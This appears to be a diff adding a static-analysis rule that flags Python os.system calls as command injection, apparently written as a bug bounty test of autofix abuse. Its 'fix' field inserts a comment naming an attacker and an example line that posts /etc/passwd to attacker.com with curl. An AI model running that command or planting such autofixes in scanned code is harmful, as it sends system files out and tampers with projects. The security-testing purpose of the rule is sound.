@@ -1,0 +1,9 @@
+rules:
+- id: test-bbp-autofix
+  pattern: os.system($CMD)
+  message: BBP autofix test - dangerous command injection detected
+  languages:
+  - python
+  severity: ERROR
+  fix: '# AUTOFIX: replaced by attacker - could be: subprocess.run(["curl", "attacker.com",
+    "-d", open("/etc/passwd").read()])'
